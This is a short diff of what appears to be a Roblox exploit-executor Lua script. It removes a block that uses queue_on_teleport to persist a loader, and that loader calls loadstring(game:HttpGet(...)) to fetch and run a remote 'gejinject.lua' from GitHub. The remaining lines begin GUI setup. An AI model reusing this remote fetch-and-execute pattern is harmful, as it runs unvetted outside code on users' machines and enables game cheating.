@@ -1,14 +1,4 @@
-wait(2)
-
-local queueonteleport = syn and syn.queue_on_teleport or queue_on_teleport or function() end
-
-local telscrt = [[
-    wait(4)
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/mikusgszyp/ezsploitfiledownloader/main/gejinject.lua", true))()
-]]
-
-queueonteleport(telscrt)
-
+wait(4)
 
 local ScreenGui = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
